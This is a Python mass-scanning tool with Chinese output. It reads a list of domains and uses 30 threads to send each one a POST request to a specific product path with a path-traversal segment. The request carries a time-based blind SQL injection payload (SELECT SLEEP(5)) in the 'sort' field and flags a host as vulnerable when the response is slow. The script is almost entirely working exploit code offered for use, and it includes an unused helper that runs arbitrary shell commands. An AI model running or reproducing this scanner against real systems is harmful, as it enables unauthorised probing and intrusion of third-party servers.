import argparse
import textwrap
import os
from xml.sax import parse
def mai(url,cmd):
    print(url,os.system(cmd))

from multiprocessing.dummy import Pool
import requests
def main(path):
    urls=[]
    with open(path,'r') as f:
        for i in f:
            domain=i.strip()
            if 'http' in domain:
                urls.append(domain)
            else:
                urls.append(f'http://{domain}')
    pool=Pool(30)
    pool.map(check,urls)
def check(domain):
    url=f'{domain}/trwfe/service/.%2E/invoker/findTenantPage.do'
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0',
        'Content-Type':'application/x-www-form-urlencoded',
        'Connection':'close'
    }
    data={
        'sort':'(SELECT 2005 FROM (SELECT(SLEEP(5)))IEWh)'
    }
    try:
        result=requests.post(url=url,headers=headers,data=data,timeout=10,verify=False)
        if result.status_code==200 and result.elapsed.total_seconds()>=5:
            print(f"[+]{domain}存在基于时间盲注的注入漏洞")
            print(f"响应时间:{result.elapsed.total_seconds():.2f}秒")
        else:
            print(f"[-]{domain}不存在基于时间盲注的注入漏洞")
            print(f"响应时间:{result.elapsed.total_seconds():.2f}秒")
    except requests.exceptions.Timeout:
        print(f"[!]{domain}请求超时")
    except Exception as e:
        print(f"[!]请求发生错误:{e}")

if __name__=='__main__':
    banner=r"""
    \__    ___/__.__.______   ____    /   _____/ ____   _____   _____/  |_|  |__ |__| ____    ____   
  |    | <   |  |\____ \_/ __ \   \_____  \ /  _ \ /     \_/ __ \   __\  |  \|  |/    \  / ___\  
  |    |  \___  ||  |_> >  ___/   /        (  <_> )  Y Y  \  ___/|  | |   Y  \  |   |  \/ /_/  > 
  |____|  / ____||   __/ \___  > /_______  /\____/|__|_|  /\___  >__| |___|  /__|___|  /\___  /  
          \/     |__|        \/          \/             \/     \/          \/        \//_____/   
    """
    print(banner)
parse=argparse.ArgumentParser(description="时间盲注检测的一个工具",formatter_class=argparse.RawDescriptionHelpFormatter,epilog=textwrap.dedent('''
example:python one.py -u http://www.baidu.com'
'''))
parse.add_argument("-u","--url",dest="url",type=str,help="example:http://www.mhx.com")
parse.add_argument("-c","--c",dest="cmd",type=str,help="example:D:/pycharm/pythonProject1/urls2.txt")
args= parse.parse_args()
main(args.cmd)